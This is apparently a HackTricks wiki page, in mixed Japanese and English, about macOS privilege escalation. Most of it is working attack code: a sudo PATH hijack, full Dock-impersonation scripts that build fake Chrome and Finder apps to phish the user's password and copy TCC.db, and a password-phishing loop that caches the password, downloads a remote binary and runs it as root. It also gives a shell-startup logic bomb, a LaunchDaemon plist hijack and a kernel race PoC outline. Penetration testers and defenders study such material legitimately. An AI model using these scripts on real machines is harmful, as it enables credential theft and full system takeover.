# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation を探してここに来た場合は、次を参照してください:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix に影響する privilege escalation のほとんどの tricks は、MacOS** マシンにも影響することに注意してください。そのため、次を参照してください:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

元の [Sudo Hijacking technique は Linux Privilege Escalation post 内](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)にあります。

ただし、macOS はユーザーが **`sudo`** を実行する際に、ユーザーの **`PATH`** を **維持します**。つまり、この attack を実行する別の方法として、被害者が **sudo を実行するときに**引き続き実行する **他の binaries を hijack** する方法があります:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock Impersonation

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案:

- DockにChromeがあるか確認し、ある場合はそのエントリを**削除**して、**fake**な**Chromeエントリ**をDock配列内の**同じ位置**に**追加**します。

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案：

- **Dock から Finder を削除することはできない**ため、Dock に追加する場合は、偽の Finder を本物のすぐ隣に配置できます。これには、**Dock 配列の先頭に偽の Finder エントリを追加する必要があります**。
- もう 1 つの方法は、Dock に配置せず、そのまま開くことです。「Finder が Finder の制御を求めています」という表示は、それほど不自然ではありません。
- パスワードを尋ねる不審なダイアログを表示せずに**root へ privilege escalation**するもう 1 つの方法は、Finder に privileged action の実行のため実際にパスワードを尋ねさせることです：
- Finder に、新しい **`sudo`** ファイルを **`/etc/pam.d`** へコピーさせる（パスワードを尋ねるプロンプトには「Finder が sudo をコピーしようとしています」と表示されます）
- 新しい **Authorization Plugin** をコピーするよう Finder に指示する（ファイル名を制御できるため、パスワードを尋ねるプロンプトには「Finder が Finder.bundle をコピーしようとしています」と表示されます）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### パスワードプロンプト phishing + sudo reuse

Malware は、user interaction を悪用して **sudo-capable password を capture** し、programmatically reuse することがよくあります。一般的な flow:

1. `whoami` で logged in user を特定する。
2. `dscl . -authonly "$user" "$pw"` が success を返すまで **password prompt を loop** する。
3. credential を（例: `/tmp/.pass` に）cache し、`sudo -S`（password over stdin）で privileged actions を実行する。

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
盗まれたパスワードは、その後 **`xattr -c` で Gatekeeper quarantine を解除**したり、LaunchDaemons やその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりするために再利用できます。

## 新しい macOS-specific vectors（2023–2025）

### 非推奨の `AuthorizationExecuteWithPrivileges` は引き続き使用可能

`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia でも引き続き動作します**。多くの commercial updaters は、信頼できないパスを指定して `/usr/libexec/security_authtrampoline` を呼び出します。対象の binary が user-writable であれば、trojan を仕込み、正規の prompt に便乗できます:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
上記の **masquerading tricks** と組み合わせて、もっともらしい password dialog を表示します。


### Privileged helper / XPC triage

現代の多くのサードパーティ製 macOS privesc は、同じパターンに従います。**root LaunchDaemon** が **`/Library/PrivilegedHelperTools`** から **Mach/XPC service** を公開し、その後 helper が **client を検証しない**、**検証が遅すぎる**（PID race）、または **user-controlled path/script** を受け取る **root method** を公開します。これは、VPN client、game launcher、updater で近年見つかっている多くの helper bug の背後にある bug class です。<sup>[4]</sup>

Quick triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特に、以下の点に注意してください。

- **uninstall 後も**、job が `launchd` にロードされたままになっているため、requests の受け付けを続けるもの
- **`/Applications/...`** または non-root users が書き込み可能なその他の paths から scripts を実行したり、configuration を読み取ったりするもの
- **PID-based** または **bundle-id-only** の peer validation に依存しており、race condition を悪用できる可能性があるもの

helper authorization bugs の詳細については、[this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) を確認してください。

### PackageKit script environment inheritance (CVE-2024-27822)

Apple が **Sonoma 14.5**、**Ventura 13.6.7**、**Monterey 12.7.5** で修正するまで、**`Installer.app`** / **`PackageKit.framework`** 経由で user-initiated installs を行うと、**PKG scripts を現在の user の environment 内で root として実行**できました。つまり、**`#!/bin/zsh`** を使用する package は、攻撃者の **`~/.zshenv`** を読み込み、victim が package をインストールした際に、それを **root として実行**できました。<sup>[3]</sup>

これは **logic bomb** として特に興味深いものです。user account への foothold と、書き込み可能な shell startup file があればよく、その後は、脆弱な **zsh-based** installer が user によって実行されるのを待つだけです。これは通常、**MDM/Munki** deployments には適用されません。これらは root user の environment 内で実行されるためです。<sup>[3]</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
インストーラー固有の abuse についてさらに詳しく知りたい場合は、[こちらのページ](macos-files-folders-and-binaries/macos-installers-abuse.md)も確認してください。

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

LaunchDaemon plist またはその `ProgramArguments` の target が **user-writable** である場合、それを差し替えた後に launchd に reload を強制することで privilege escalation できます：
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
これは、書き込み可能な plist を悪用して attacker の code を root として実行した、**CVE-2025-24085** で公開された exploit pattern を反映しています。

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` の **race** により、local attacker は複数の thread で `setgid()`/`getgid()` loop を実行し、torn `memcpy` が発生するまで race することで、read-only credential pointer（`proc_ro.p_ucred`）を破壊できます。破壊に成功すると、**uid 0** と kernel memory access が得られます。最小限の PoC structure は次のとおりです。
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Controlled data を pointer が再読み込みされる場所に配置するため、heap grooming と組み合わせます。脆弱な build では、SIP bypass の要件なしで信頼性の高い **local kernel privesc** が可能です。<sup>[2]</sup>

### Migration assistant 経由の SIP bypass（"Migraine"、CVE-2023-32369）

すでに root を取得していても、SIP は system locations への書き込みをブロックします。**Migraine** bug は、Migration Assistant の entitlement `com.apple.rootless.install.heritable` を悪用して、SIP bypass を継承する child process を起動し、保護された path（例：`/System/Library/LaunchDaemons`）を上書きします。<sup>[1]</sup> chain は次のとおりです。

1. 稼働中の system で root を取得する。
2. 細工した state を使用して `systemmigrationd` を trigger し、attacker-controlled binary を実行させる。
3. 継承した entitlement を使用して SIP-protected files に patch を適用し、reboot 後も persistence させる。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

複数の Apple daemon は XPC 経由で **NSPredicate** objects を受け取り、`expressionType` field のみを validation します。この field は attacker-controlled です。任意の selector を評価する predicate を作成することで、**root/system XPC services**（例：`coreduetd`、`contextstored`）で **code execution** を実現できます。initial app sandbox escape と組み合わせると、**user prompts なしの privilege escalation** が可能になります。predicate を deserialize する一方で、robust な visitor を備えていない XPC endpoint を探してください。

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass と privilege escalation

**Any user**（unprivileged user も含む）は、`-o noowners` を指定して Time Machine snapshot を作成および mount でき、その snapshot 内の **ALL the files** にアクセスできます。これにより、live volume 上の ownership checks を bypass できます。必要な privilege は、使用する application（`Terminal` など）が **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）を持っていることだけです。

commands と完全な説明は TCC bypasses page にあります。

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

これは privilege escalation に役立つ場合があります。


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Microsoft "Migraine" SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [CVE-2025-24118 SMR credential race write-up と PoC](https://github.com/jprx/CVE-2025-24118)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
